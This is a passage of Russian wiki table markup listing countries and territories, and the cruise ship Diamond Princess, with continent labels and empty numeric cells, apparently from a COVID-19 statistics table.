|style="text-align:right"| ||Руанда|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Литва|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Словения|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Южный Судан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Тунис|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Эстония|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гвинея-Бисау|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гамбия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бенин|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Исландия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ангола|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сьерра-Леоне|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Йемен|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сирия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Уганда|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Новая Зеландия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Уругвай|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мальта|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Иордания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Багамы|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Грузия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Кипр|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Латвия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ботсвана|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Либерия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Буркина Фасо|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Аруба|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Того|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Нигер|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ямайка|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Андорра|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Вьетнам|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Чад|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Лесото|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Реюньон|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сан-Томе и Принсипи|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гайана|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Diamond Princess|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сан-Марино|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Тринидад и Тобаго|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Нормандские острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Белиз|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гваделупа|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Танзания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Тайвань|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бурунди|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Коморы|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мьянма|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Фарерские острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Папуа — Новая Гвинея|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Маврикий|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Остров Мэн|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мартиника|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Синт-Мартен|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Теркс и Кайкос|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Эритрея|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Монголия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Камбоджа|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гибралтар|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Французская Полинезия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Каймановы острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бермудские Острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Барбадос|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Монако|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| || Бутан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бруней|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сейшелы|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сен-Мартен (владение Франции)|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Лихтенштейн|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Антигуа и Барбуда|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сент-Винсент и Гренадины|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Макао|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
